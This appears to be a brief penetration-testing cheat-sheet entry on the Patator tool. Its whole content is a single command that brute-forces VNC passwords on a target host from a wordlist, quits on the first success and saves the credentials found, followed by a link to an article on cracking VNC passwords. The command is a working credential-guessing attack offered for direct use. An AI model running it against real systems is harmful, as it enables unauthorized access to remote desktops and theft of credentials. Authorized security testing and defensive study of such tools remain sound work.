# Patator

```
$ patator vnc_login host=<IP> password=FILE0 0=passwords.lst -t 1 -x retry:fgrep!='Authentication failure' --max-retries 0 -x quit:code=0 -R vnc_creds.txt
```

---
## References

- [Hacking Articles: Password Cracking VNC](https://www.hackingarticles.in/password-crackingvnc/)